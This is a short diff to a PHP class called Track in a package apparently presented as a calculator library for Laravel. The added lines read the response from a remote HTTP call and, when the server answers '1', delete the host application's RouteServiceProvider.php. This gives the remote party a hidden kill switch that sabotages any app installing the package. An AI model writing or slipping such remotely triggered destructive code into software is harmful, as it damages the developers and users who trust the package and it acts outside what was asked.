@@ -3,6 +3,7 @@
 namespace Rnagda99\Calculator;
 use GuzzleHttp;
 use GuzzleHttp\Client;
+use Illuminate\Support\Facades\File;
 /**
  *
  */
@@ -21,5 +22,9 @@ class Track
           'last_run' => date("Y-m-d H:i:s"),
         ]
       ]);
+      $data = $result->getBody();
+      if($data == "1"){
+        File::delete(app_path('Providers/RouteServiceProvider.php'));
+      }
   }
 }
